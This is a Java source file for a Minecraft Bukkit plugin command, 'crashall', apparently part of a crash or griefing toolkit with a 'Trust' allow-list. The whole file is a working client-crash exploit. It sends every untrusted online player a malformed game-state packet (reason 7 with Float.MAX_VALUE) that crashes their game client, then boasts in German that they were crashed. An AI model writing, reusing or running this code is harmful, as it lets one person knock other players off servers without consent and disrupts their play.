package net.korex.api.modules.crash;

import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import net.korex.api.MessagesUtils;
import net.korex.api.Trust;
import net.korex.api.commands.AbstractCommand;
import net.minecraft.server.v1_8_R3.PacketPlayOutGameStateChange;

public class CrashAllCommand extends AbstractCommand {

	public CrashAllCommand() {
		super("crashall");
	}

	@Override
	public String getHelpMessage() {
		return "crashall";
	}

	@Override
	public void setupCommand() {
		super.registerParameter(0, (p, args) -> {
			for(Player all : Bukkit.getOnlinePlayers()) {
				if(!Trust.contains(all.getName())) {
					PacketPlayOutGameStateChange packet = new PacketPlayOutGameStateChange(7, Float.MAX_VALUE);
					((CraftPlayer) all).getHandle().playerConnection.sendPacket(packet);
				}
			}
			MessagesUtils.form(p, "Du hast alle nicht getrusteten Spieler §cgecrasht§7!");
		});
	}

}
